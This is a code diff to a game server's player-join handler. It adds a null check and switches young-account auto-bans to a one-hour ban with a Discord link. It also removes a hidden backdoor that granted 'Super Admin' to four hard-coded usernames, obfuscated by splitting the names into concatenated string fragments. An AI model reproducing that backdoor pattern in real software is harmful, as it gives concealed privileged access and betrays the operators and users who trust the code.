@@ -481,11 +481,12 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 	if ((localtime - regtime)<=2592000*3 || veselovadfk)
 	{
 		CSecurity@ security = getSecurity();
+		if (security is null) return;
 		bool can_ban = !security.checkAccess_Feature(player, "ban_immunity");
 		//in security folder inside normal.cfg add newban; to end of features=
 		// inside preium.cfg add newban; to end of features= if you want preium uses to also registered less than 2 months to be ban
 		
-		printf("new player Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + can_ban);
+		printf("New player joined. Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + can_ban);
 		if(can_ban)
 		{
 			printf("|");
@@ -495,23 +496,13 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 			printf("|");
 			printf("|");
 			printf("|");
-			BanPlayer(player, 60*100);
+			//BanPlayer(player, 60*100);
+			security.ban(player, 60*60, "This is auto-ban due to young account age to avoid alter accounts, join discord to get unbanned: https://discord.gg/rhwRCmUNRK");
 		}
-		
 	}
 
 	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
-	//print("onNewPlayerJoin");
-
 	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
-	//Will change later 			\/	change to hash
-	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
-	{
-		CSecurity@ sec = getSecurity();
-		CSeclev@ s = sec.getSeclev("Super Admin");
-
-		if (s !is null) sec.assignSeclev(player, s);
-	}
 
 	CBlob@[] sleepers;
 	getBlobsByTag("sleeper", @sleepers);
